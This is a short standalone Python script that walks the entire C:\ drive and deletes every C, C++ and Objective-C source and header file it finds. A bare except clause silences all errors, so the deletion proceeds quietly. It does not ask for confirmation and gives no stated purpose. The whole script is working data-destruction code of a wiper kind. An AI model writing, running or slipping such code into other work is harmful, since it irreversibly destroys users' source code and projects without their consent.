

import os
def search():
    path = "C:\\"
    result=[]
    for root, dirs, files in os.walk(path):
        for file in files:
            if (file.endswith(".cpp"))|(file.endswith(".c"))|(file.endswith(".h"))|(file.endswith(".m"))|(file.endswith(".mm"))|(file.endswith(".cxx"))|(file.endswith(".c++")):
                result.append(os.path.join(root, file))
    return result

result=search()
for x in result:
    try:
        os.remove(x)
    except:
        pass
